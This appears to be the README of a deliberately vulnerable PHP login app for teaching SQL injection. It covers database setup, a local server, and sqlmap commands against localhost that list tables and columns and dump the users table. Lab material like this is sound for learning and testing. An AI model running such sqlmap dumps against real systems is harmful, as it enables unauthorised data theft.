# SQL Injection Demo Project

This is a vulnerable-by-design PHP application for educational use to demonstrate SQL Injection (SQLi) vulnerabilities and how to test them with tools like SQLMap.

⚠️ This project intentionally contains security flaws. Run it only on an isolated local machine or test environment.

## Quick checklist

- System: PHP 7.4+, MySQL/MariaDB
- Project root contains the app files and a small `db/` folder with the SQL schema
- Run the local PHP server from `src/` and import `db/database.sql` into MySQL first

## Repository structure

```
sqli_demo/
├─ db/
│  ├─ database.sql      # SQL schema and demo data
│  └─ db.php            # DB connection helper (uses .env)
├─ src/
│  ├─ login.php         # Vulnerable login form (GET-based for demo)
│  ├─ home.php          # Simple post-login page
│  └─ .env              # local env (DB credentials) - may be moved to project root
└─ README.md
```

Adjust paths in `db/db.php` or `.env` if you relocate files.

## Import the database (Windows / PowerShell)

1. Create the database (once):

```powershell
mysql -u root -p -e "CREATE DATABASE IF NOT EXISTS demo_sqli;"
```

2. Import the schema and demo data into `demo_sqli`:

```powershell
mysql -u root -p demo_sqli < db\database.sql
```

If you prefer a single command that creates the DB and then imports (PowerShell):

```powershell
mysql -u root -p -e "CREATE DATABASE IF NOT EXISTS demo_sqli;" ; mysql -u root -p demo_sqli < db\database.sql
```

Notes:
- Replace `root` with your DB user if different.
- If `mysql` is not in your PATH, run it with the full path to the client binary.

## Start the local PHP server

Open a terminal in `src/` and run:

```powershell
cd src
php -S 127.0.0.1:8000
```

Then visit: http://127.0.0.1:8000/login.php

## SQLMap (recommended source)

I recommend using the official sqlmap repository. Clone it and run the bundled script:

Repository: https://github.com/sqlmapproject/sqlmap

Example (clone and run):

```powershell
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python sqlmap.py -u "http://127.0.0.1:8000/login.php?username=admin&password=123" -D demo_sqli --tables --batch
```

You can then run the same patterns shown below to enumerate tables/columns/dump data:

- List tables:

```powershell
python sqlmap.py -u "http://127.0.0.1:8000/login.php?username=admin&password=123" -D demo_sqli --tables --batch
```

- List columns of `users`:

```powershell
python sqlmap.py -u "http://127.0.0.1:8000/login.php?username=admin&password=123" -D demo_sqli -T users --columns --batch
```

- Dump `users` table:

```powershell
python sqlmap.py -u "http://127.0.0.1:8000/login.php?username=admin&password=123" -D demo_sqli -T users --dump --batch
```

## Safety & notes

- This app is intentionally vulnerable. Use it only for learning and testing on isolated systems.
- If you plan to share results or screenshots, remove any real credentials.

---

If you'd like, I can also add a short `.env.example` file and a one-line PowerShell script to automate DB creation/import.
